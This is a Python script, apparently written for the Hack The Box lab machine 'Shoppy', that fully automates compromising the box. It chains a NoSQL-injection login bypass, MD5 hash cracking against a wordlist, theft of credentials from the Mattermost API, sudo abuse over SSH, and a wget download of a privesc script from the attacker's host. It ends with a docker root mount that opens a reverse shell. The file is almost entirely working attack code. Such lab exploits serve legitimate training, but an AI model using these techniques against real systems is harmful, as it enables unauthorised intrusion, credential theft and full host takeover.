import argparse
import hashlib
import json
import paramiko		 
import requests 	 
import shlex		 
import signal
import subprocess
import sys
import time

from pwn import * 	 

""" 
Autopwn Shoppy HTB Machine
--------------------------
Author: Marss
Date: Sep 30, 2022 
"""

# Variables
target_host = '10.10.11.180'
wordlist_filename = 'rockyou.txt'

# ctrl + c
def signal_handler(signum, frame): sys.exit('\n[!] User terminated.')

signal.signal(signal.SIGINT, signal_handler)

# make get/post request
def make_request(session, method, target_url, headers=None, cookies=None, json_data=None):
	response = ''
	try:
		if method == 'get':
			response = session.get(target_url, headers=headers, cookies=cookies)
		elif method == 'post':
			response = session.post(target_url, headers=headers, json=json_data)
	except Exception as error:
		print('[x] Error: %s' % error)
	return response

# read wordlist file
def get_wordlist():
	with open(wordlist_filename, 'r', errors='replace') as file: # errors='replace' (UnicodeDecodeError)
		wordlist = file.readlines()
	return wordlist

# convert password to hash (md5)
def to_hash(password):
	password_hash = hashlib.md5(password.encode())
	return password_hash.hexdigest()

# crack password hash
def cracking_password(password_hash, wordlist=get_wordlist()):
	for word in wordlist:
		word = word.strip('\n')
		if to_hash(word) == password_hash:
			return word

# connect via ssh and run commands
def ssh_exec_commands_like(ssh_username, ssh_password, commands):
	_stdout_commands = []
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(target_host, port=22, username=ssh_username, password=ssh_password)

		for command in commands:
			_stdout = ''
			if 'sudo' in command:
				_stdin, _stdout, _stderr = client.exec_command(command, get_pty=True)
				_stdin.write(ssh_password + '\n')
				_stdin.flush()
			else:
				_stdin, _stdout, _stderr = client.exec_command(command, get_pty=True)
			_stdout_commands.append(_stdout.read().decode())
		
		client.close()
	except Exception as error:
		print('[x] Error: %s' % error)
	
	return _stdout_commands

# bypass login to shoppy.htb (Mongo NoSQLi) and return Josh password hash
def get_josh_password_hash():
	josh_password_hash = ''

	try:
		session = requests.Session()
		
		log.info('Bypass login')

		headers = {'Content-Type':'application/json'}
		post_data = {
			"username" : "admin'||' 1==1",
			"password" : ""
		}

		_ = make_request(session=session, method='post', target_url='http://shoppy.htb/login', headers=headers, json_data=post_data)
		cookies = session.cookies.get_dict()
		
		log.info('Extract password')

		_ = make_request(session=session, method='get', target_url='http://shoppy.htb/admin/search-users?username=josh', cookies=cookies)
		response = make_request(session=session, method='get', target_url='http://shoppy.htb/exports/export-search.json', cookies=cookies)
		josh_password_hash = json.loads(response.text)[0]['password']
				
		session.close()
	except Exception as error:
		print('[x] Error: %s' % error)

	return josh_password_hash

# login mattermost.shoppy.htb (Josh credentials) and return credentials from user Jaeger
def get_jaeger_credentials(josh_password_text):
	deploy_machine_username = ''
	deploy_machine_password = ''

	try:
		session = requests.Session()
		
		log.info('Persistent login to mattermost API')

		headers = {"Content-Type" : "application/json"}
		post_data = {
			"login_id" : "josh",
			"password" : "{}".format(josh_password_text)
		}

		response = make_request(session=session, method='post', target_url='http://mattermost.shoppy.htb/api/v4/users/login', headers=headers, json_data=post_data)
		user_mfa_token = response.headers['Token']
		user_id = json.loads(response.text)['id']

		headers = {"Authorization" : "Bearer {}".format(user_mfa_token)}

		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/users/{user_id}/teams', headers=headers)
		user_teams_id = json.loads(response.text)[0]['id']

		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/teams/{user_teams_id}/channels/name/deploy-machine', headers=headers)
		deploy_machine_channel_id = json.loads(response.text)['id']
		
		response = make_request(session=session, method='get', target_url=f'http://mattermost.shoppy.htb/api/v4/channels/{deploy_machine_channel_id}/posts', headers=headers)
		deploy_machine_username = json.loads(response.text)['posts']['ki1a198dybd7icutcjsa1ut6iy']['message'].split()[16]
		deploy_machine_password = json.loads(response.text)['posts']['ki1a198dybd7icutcjsa1ut6iy']['message'].split()[18]

		session.close()
	except Exception as error:
		print('[x] Error: %s' % error)

	return deploy_machine_username, deploy_machine_password

# ssh login (jaeger user) and return credentials from user Deploy
def get_deploy_user_credentials(deploy_machine_username, deploy_machine_password):
	ssh_commands_response = ssh_exec_commands_like(
		deploy_machine_username, deploy_machine_password, 
		['sudo -l', 'sudo -u deploy /home/deploy/password-manager <<< "Sample"'])

	deploy_user_username = ssh_commands_response[1].strip().split('\n')[-2].split()[1]
	deploy_user_password = ssh_commands_response[1].strip().split('\n')[-1].split()[1]

	return deploy_user_username, deploy_user_password

# ssh login (deploy user) and get shell
def interactive_shell(args, deploy_user_username, deploy_user_password):
	init_server = f'/usr/bin/python3 -m http.server {args.port}'
	server_process = subprocess.Popen(shlex.split(init_server), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	
	log.info('Cron process file uploaded')

	ssh_commands_response = ssh_exec_commands_like(deploy_user_username, deploy_user_password, 
		[f'wget http://{args.ip}:{args.port}/privesc.sh -O /tmp/privesc.sh', 
		'chmod +x /tmp/privesc.sh', 
		f'docker run -it -v /:/tmp --rm alpine sh /tmp/tmp/privesc.sh {args.ip} {args.port}'])
	
	server_process.kill(); time.sleep(5)

	shell = listen(args.port, timeout=60).wait_for_connection()
	
	if shell.sock:
		log.info('Press Ctrl + D to exit')
		shell.interactive()

# exploitation process
def run(args):
	process = log.progress('Starting attack')

	# (1) bypass login to shoppy.htb (Mongo NoSQLi), extract Josh password hash and crack it
	process.status('Extracting and Cracking Josh password hash')
	josh_password_text = cracking_password(password_hash=get_josh_password_hash())
	log.success(f'Cracked password: {josh_password_text}')


	# (2) login mattermost.shoppy.htb (Josh credentials) extract the Jaeger credentials for the Deploy machine
	process.status('Extracting the Jaeger credentials for the Deploy machine')
	deploy_machine_username, deploy_machine_password = get_jaeger_credentials(josh_password_text)
	log.success(f'Credentials obtained: {deploy_machine_username}:{deploy_machine_password}')


	# (3) ssh login (jaeger user), privileges for specific command and binary reverse engineering (get credentials)
	process.status('Extracting the Jaeger credentials for the Deploy machine')
	deploy_user_username, deploy_user_password = get_deploy_user_credentials(deploy_machine_username, deploy_machine_password)
	log.success(f'Credentials obtained: {deploy_user_username}:{deploy_user_password}')


	# (4) ssh login (deploy user) and mount root system with docker socket to execute reverse shell
	process.status('Abusing docker group membership to run privileged commands')
	interactive_shell(args, deploy_user_username, deploy_user_password)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description='Autopwn Shoppy HTB Machine',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help='specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='specified PORT to receive the shell')

	args = parser.parse_args()

	run(args)

# References:
#------------
# https://api.mattermost.com/#tag/authentication
